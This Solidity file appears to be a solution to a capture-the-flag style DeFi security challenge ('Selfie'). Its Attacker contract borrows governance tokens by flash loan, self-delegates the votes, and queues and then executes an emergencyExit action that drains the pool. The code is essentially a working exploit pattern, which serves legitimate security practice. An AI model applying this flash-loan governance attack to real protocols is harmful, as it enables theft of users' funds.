// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";


contract Attacker is IERC3156FlashBorrower {

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    DamnValuableVotes public immutable voteToken;
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    address public immutable recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        voteToken = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    /** 
    * When we are on flash loan, we will queue our action
    * which sends request to selfiepool to emergency exit.
    * - Create actionData emergencyExit(recovery address)
    * - We delegate tokens to ourselves, since governance checks our votes.
    * - Queue action
    * - Approve pool to allow using our token
    * - Return CALLBACK_SUCCESS
    */
    function onFlashLoan(address initiator,address token,uint256 amount,uint256 fee,bytes calldata data) external returns (bytes32) {
            
            // bytes actionData = abi.encodeWithSelector(bytes4, arg);;
            bytes memory actionData = abi.encodeWithSignature("emergencyExit(address)", recovery);
            voteToken.delegate(address(this));
            governance.queueAction(address(pool), 0, actionData);
            IERC20(token).approve(address(pool), 2_000_000e18);
            return CALLBACK_SUCCESS;
    }

    /**
    * - Get flashloan
    * - Queue action on flash loan
    * - Since we need to wait for delay, I've seperated queue action and execute action
     */
    function flashLoanAndQueueAction() external {
        uint256 amount = pool.maxFlashLoan(address(voteToken));
        pool.flashLoan(this, address(voteToken), amount, "");
        // Here onFlashLoan will be executed (initiated from selfiepool)
    }

    function executeAction() external {
        uint256 actionId = governance.getActionCounter() - 1; // Last action is ours
        governance.executeAction(actionId);
    }
}